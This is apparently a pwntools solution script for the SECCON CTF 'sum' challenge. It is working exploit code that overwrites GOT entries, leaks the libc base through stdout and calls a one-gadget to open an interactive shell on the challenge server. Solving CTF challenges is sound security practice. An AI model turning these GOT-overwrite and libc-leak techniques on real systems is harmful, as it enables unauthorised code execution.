#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./sum"

rhp1 = {"host":"sum.chal.seccon.jp","port":10001}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("./libc.so")

onegadgets = [0x4f2c5,0x4f322,0x10a38c]
main_addr = 0x400903
pop_rdi_gad = 0x400a43 #in "sum"
ret_gad = 0x4005ee
pop_pop_gad = 0x400a41

def send(conn,n1,n2,n3,n4,n5,n6=0):
  conn.recvuntil("0")
  if n6==0:
    conn.sendline(str(n1)+" "+str(n2)+" "+str(n3)+" "+str(n4)+" "+str(n5))
  else:
    conn.sendline(str(n1)+" "+str(n2)+" "+str(n3)+" "+str(n4)+" "+str(n5)+" "+str(n6))

def exploit(conn):
  #overwrite setvbuf with puts, stdout with stdout+0x10, and exit with _start
  send(conn,1,-1,1,-1,main_addr - binf.got["exit"],binf.got["exit"])
  send(conn,1,-1,1,-1,binf.plt["puts"] - binf.got["setvbuf"], binf.got["setvbuf"])
  send(conn,1,-1,1,-1,-binf.symbols["stdout"]-0x7 + 0x70<<(8*0x7), binf.symbols["stdout"]-0x7)
  send(conn,1,-1,1,-1,binf.functions["_start"].address - binf.got["exit"], binf.got["exit"])

  #leak libc base
  print(conn.recvuntil("2 3 4 0\n"))
  print(conn.recvuntil("2 3 4 0\n"))
  print(conn.recvuntil("2 3 4 0\n"))
  stdoutx83 = unpack(conn.recvline()[:-1].ljust(8,'\x00'))
  stdout_addr = stdoutx83-0x83
  print("[+]_IO_2_1_stdout_: "+hex(stdout_addr))
  libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
  print("[+]libc_base: "+hex(libc_base))

  #overwrite GOT with onegadget and invoke it
  send(conn,1,-1,1,-1,onegadgets[2]+libc_base - binf.got["exit"], binf.got["exit"])
  
if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

